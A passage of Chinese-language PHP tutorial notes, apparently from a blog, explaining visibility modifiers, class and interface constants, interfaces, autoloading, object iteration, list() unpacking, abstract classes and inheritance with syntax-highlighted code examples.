operator">></span><span class="token keyword">public</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行能被正常执行</span><span class="token keyword">echo</span> <span class="token variable">$obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">protected</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行会产生一个致命错误</span><span class="token keyword">echo</span> <span class="token variable">$obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">private</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行也会产生一个致命错误</span><span class="token variable">$obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">printHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 Public、Protected 和 Private</span><span class="token comment" spellcheck="true">/*** Define MyClass2*/</span><span class="token keyword">class</span> <span class="token class-name">MyClass2</span> <span class="token keyword">extends</span> <span class="token class-name">MyClass</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 可以对 public 和 protected 进行重定义，但 private 而不能</span>  <span class="token keyword">public</span> <span class="token variable">$public</span> <span class="token operator">=</span> <span class="token string">'Public2'</span><span class="token punctuation">;</span>  <span class="token keyword">protected</span> <span class="token variable">$protected</span> <span class="token operator">=</span> <span class="token string">'Protected2'</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">printHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">public</span><span class="token punctuation">;</span>      <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">protected</span><span class="token punctuation">;</span>      <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">private</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$obj2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$obj2</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">public</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行能被正常执行</span><span class="token keyword">echo</span> <span class="token variable">$obj2</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">protected</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行会产生一个致命错误</span><span class="token keyword">echo</span> <span class="token variable">$obj2</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">private</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 未定义 private</span><span class="token variable">$obj2</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">printHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 Public、Protected2 和 Undefined</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="类常量："><a href="#类常量：" class="headerlink" title="类常量："></a>类常量：</h3><blockquote><p>可以把在类中始终保持不变的值定义为常量。在定义和使用常量的时候不需要使用 $ 符号。</p><p>常量的值必须是一个定值，不能是变量，类属性，数学运算的结果或函数调用。</p><p>接口（interface）中也可以定义常量。</p><p>自 PHP 5.3.0 起，可以用一个变量来动态调用类。但该变量的值不能为关键字（如 <code>self</code>，<code>parent</code> 或 <code>static</code>）。</p></blockquote><h4 id="类常量的定义："><a href="#类常量的定义：" class="headerlink" title="类常量的定义："></a>类常量的定义：</h4><blockquote><p>类常量用const 定义</p><p>类常量使用：：号调用</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">MyClass</span><span class="token punctuation">{</span>    <span class="token keyword">const</span> constant <span class="token operator">=</span> <span class="token string">'constant value'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">showConstant</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span>  self<span class="token punctuation">:</span><span class="token punctuation">:</span>constant <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">echo</span> MyClass<span class="token punctuation">:</span><span class="token punctuation">:</span>constant <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token variable">$classname</span> <span class="token operator">=</span> <span class="token string">"MyClass"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$classname</span><span class="token punctuation">:</span><span class="token punctuation">:</span>constant <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 自 5.3.0 起</span><span class="token variable">$class</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$class</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">showConstant</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$class</span><span class="token punctuation">:</span><span class="token punctuation">:</span>constant<span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 自 PHP 5.3.0 起</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="接口："><a href="#接口：" class="headerlink" title="接口："></a>接口：</h3><blockquote><p>使用接口（interface），可以指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容。</p><p>接口是通过 <code>interface</code> 关键字来定义的，就像定义一个标准的类一样，但其中定义所有的方法都是空的。</p><p>接口中定义的所有方法都必须是公有，这是接口的特性。</p><p>在接口中定义一个<a href="https://www.php.net/manual/zh/language.oop5.decon.php#language.oop5.decon.constructor">构造方法</a>是被允许的。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>   <span class="token keyword">interface</span> <span class="token class-name">kou</span>   <span class="token punctuation">{</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//接口所有的方法都为空</span>   <span class="token punctuation">}</span>   <span class="token keyword">class</span> <span class="token class-name">jie</span> <span class="token keyword">implements</span> <span class="token class-name">kou</span><span class="token comment" spellcheck="true">//类中必须实现所有的接口</span>   <span class="token punctuation">{</span>      <span class="token keyword">public</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>         <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span>         <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>   <span class="token punctuation">}</span>   <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">jie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span> <span class="token string">"\t"</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="接口的扩充"><a href="#接口的扩充" class="headerlink" title="接口的扩充"></a>接口的扩充</h4><blockquote><p>接口可以继承，所以可以使用继承的方法扩充接口</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">interface</span> <span class="token class-name">a</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">interface</span> <span class="token class-name">b</span> <span class="token keyword">extends</span> <span class="token class-name">a</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">baz</span><span class="token punctuation">(</span>Baz <span class="token variable">$baz</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">interface</span> <span class="token class-name">c</span> <span class="token keyword">extends</span> <span class="token class-name">a</span><span class="token punctuation">,</span> b<span class="token comment" spellcheck="true">//继承多个接口</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">baz</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 正确写法</span><span class="token keyword">class</span> <span class="token class-name">c</span> <span class="token keyword">implements</span> <span class="token class-name">b</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">baz</span><span class="token punctuation">(</span>Baz <span class="token variable">$baz</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 错误写法会导致一个致命错误</span><span class="token keyword">class</span> <span class="token class-name">d</span> <span class="token keyword">implements</span> <span class="token class-name">b</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">baz</span><span class="token punctuation">(</span>Foo <span class="token variable">$foo</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="接口常量"><a href="#接口常量" class="headerlink" title="接口常量"></a>接口常量</h4><blockquote><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">interface</span> <span class="token class-name">a</span><span class="token punctuation">{</span>    <span class="token keyword">const</span> b <span class="token operator">=</span> <span class="token string">'Interface constant'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 输出接口常量</span><span class="token keyword">echo</span> a<span class="token punctuation">:</span><span class="token punctuation">:</span>b<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 错误写法，因为常量不能被覆盖。接口常量的概念和类常量是一样的。</span><span class="token keyword">class</span> <span class="token class-name">b</span> <span class="token keyword">implements</span> <span class="token class-name">a</span><span class="token punctuation">{</span>    <span class="token keyword">const</span> b <span class="token operator">=</span> <span class="token string">'Class constant'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接口常量和类常量无本质的不同</p></blockquote><ul><li><p>实现</p><blockquote><p>要实现一个接口，使用 <code>implements</code>（实施） 操作符。类中必须实现接口中定义的所有方法，否则会报一个致命错误。类可以实现多个接口，用逗号来分隔多个接口的名称。</p><p>接口也可以继承，通过使用 <a href="https://www.php.net/manual/zh/language.oop5.inheritance.php">extends</a> 操作符。</p><p>类要实现接口，必须使用和接口中所定义的方法完全一致的方式。否则会导致致命错误。</p><p>接口中也可以定义常量。接口常量和<a href="https://www.php.net/manual/zh/language.oop5.constants.php">类常量</a>的使用完全相同，但是不能被子类或子接口所覆盖。</p></blockquote></li></ul><h3 id="类的自动加载"><a href="#类的自动加载" class="headerlink" title="类的自动加载"></a>类的自动加载</h3><h4 id="sql-autoload-register-函数可实现自定义加载"><a href="#sql-autoload-register-函数可实现自定义加载" class="headerlink" title="sql_autoload_register()函数可实现自定义加载"></a>sql_autoload_register()函数可实现自定义加载</h4><blockquote><p>英译：autoload:自动加载  register:登记</p><p> <a href="https://www.php.net/manual/zh/function.spl-autoload-register.php">spl_autoload_register()</a> 函数可以注册任意数量的自动加载器，当使用尚未被定义的类（class）和接口（interface）时自动去加载。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">spl_autoload_register</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$class_name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">require_once</span> <span class="token variable">$class_name</span> <span class="token punctuation">.</span> <span class="token string">'.php'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$obj</span>  <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$obj2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token function">spl_autoload_register</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/Controller$/'</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">"controllers/${name}"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/Model$/'</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">"models/${name}"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">include_once</span> <span class="token string">"${name}.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h3><blockquote><p>重载（overloading）是指动态地创建类属性和方法,通过魔术方法实现</p><p>所有的重载方法都必须被声明为 <code>public</code>。</p><p><strong>简单理解为调用魔术函数</strong></p></blockquote><h3 id="遍历对象"><a href="#遍历对象" class="headerlink" title="遍历对象"></a>遍历对象</h3><h4 id="foreach-语句用于遍历对象"><a href="#foreach-语句用于遍历对象" class="headerlink" title="foreach()语句用于遍历对象"></a>foreach()语句用于遍历对象</h4><blockquote><p><code>foreach</code> （遍历）仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：</p><pre><code>foreach (iterable_expression(可迭代的表达式) as $value)    statement（说明）//遍历给定的 iterable_expression 迭代器。每次循环中，当前单元的值被赋给 $value。foreach (iterable_expression as $key =&gt; $value)    statement//第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 $key。</code></pre></blockquote><h4 id="自定义遍历对象"><a href="#自定义遍历对象" class="headerlink" title="自定义遍历对象"></a>自定义遍历对象</h4><blockquote><p>通过加上 &amp; 来修改数组的元素。将以<a href="https://www.php.net/manual/zh/language.references.php">引用</a>赋值而不是拷贝一个值。</p><p>同指针的概念，修改引用值原值同样改变</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$arr</span> <span class="token keyword">as</span> <span class="token operator">&amp;</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$value</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// $arr is now array(2, 4, 6, 8)</span><span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 最后取消掉引用</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//数组最后一个元素的 $value 引用在 foreach 循环之后仍会保留。建议使用 unset() 来将其销毁</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>foreach</code> 不支持用 “<code>@</code>” 来抑制错误信息的能力。</p></blockquote><h3 id="用-list-给嵌套的数组解包"><a href="#用-list-给嵌套的数组解包" class="headerlink" title="用 list() 给嵌套的数组解包"></a>用 list() 给嵌套的数组解包</h3><blockquote><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//定义多个数组</span>    <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$array</span> <span class="token keyword">as</span> <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//使用list（）函数可以解开多个定义的函数，分别赋值给$a,$b</span>    <span class="token comment" spellcheck="true">// $a contains the first element of the nested array,</span>    <span class="token comment" spellcheck="true">// and $b contains the second element.</span>    <span class="token keyword">echo</span> <span class="token string">"A: $a; B: $b\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//结果：</span><span class="token comment" spellcheck="true">//A: 1; B: 2</span><span class="token comment" spellcheck="true">//A: 3; B: 4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.php.net/manual/zh/function.list.php">list()</a> 中的单元可以少于嵌套数组的，此时多出来的数组单元将被忽略：</p></blockquote><h3 id="抽象类："><a href="#抽象类：" class="headerlink" title="抽象类："></a>抽象类：</h3><blockquote><p>任何一个类，如果它里面至少有一个方法是被声明为抽象的，那么这个类就必须被声明为抽象的。</p><p>继承一个抽象类的时候，子类必须定义父类中的所有抽象方法；</p><p>但无需在定义非抽象的方法</p><p>属性无法抽象</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">chou</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">xaing</span> <span class="token keyword">extends</span> <span class="token class-name">chou</span><span class="token punctuation">{</span>             <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//无法直接实例化，但可以继承</span>    <span class="token variable">$shikl</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">xaing</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$shikl</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"\t"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$shikl</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>    <span class="token comment" spellcheck="true">//输出结果：1 2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制:"></a>访问控制:</h3><blockquote><p>对属性或方法的访问控制（PHP 7.1.0 以后支持常量），是通过在前面添加关键字 <em>public</em>（公有），<em>protected</em>（受保护）或 <em>private</em>（私有）来实现的。被定义为公有的类成员可以在任何地方被访问。被定义为受保护的类成员则可以被其自身以及其子类和父类访问。被定义为私有的类成员则只能被其定义所在的类访问。</p></blockquote><blockquote><p>类属性必须定义为公有，受保护，私有之一。如果用 <em>var</em>(变量)或没有设置关键字，则被视为公有。</p></blockquote><h4 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h4><blockquote><p>extends 译为：延伸</p><p>将父类的属性和方法继承给子类，子类可以重新对父类的方法进行定义和添加</p><p>限制：</p><p>可重新定义public属性和protected属性，不能重新定义private属性</p></blockquote><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//代码示例</span><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/** * Define MyClass */</span><span class="token keyword">class</span> <span class="token class-name">MyClass</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 声明一个公有的构造函数</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 声明一个公有的方法</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">MyPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 声明一个受保护的方法</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">MyProtected</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 声明一个私有的方法</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">MyPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 此方法为公有</span>    <span class="token keyword">function</span> <span class="token function">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">MyPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">MyProtected</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">MyPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$myclass</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">;</span><span class="token variable">$myclass</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">MyPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行能被正常执行</span><span class="token variable">$myclass</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">MyProtected</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行会产生一个致命错误</span><span class="token variable">$myclass</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">MyPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行会产生一个致命错误</span><span class="token variable">$myclass</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 公有，受保护，私有都可以执行</span><span class="token comment" spellcheck="true">/** * Define MyClass2 */</span><span class="token keyword">class</span> <span class="token class-name">MyClass2</span> <span class="token keyword">extends</span> <span class="token class-name">MyClass</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 此方法为公有</span>    <span class="token keyword">function</span> <span class="token function">Foo2</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">MyPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">MyProtected</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">MyPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行会产生一个致命错误</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$myclass2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass2</span><span class="token punctuation">;</span><span class="token variable">$myclass2</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">MyPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行能被正常执行</span><span class="token variable">$myclass2</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Foo2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 公有的和受保护的都可执行，但私有的不行</span><span class="token keyword">class</span> <span 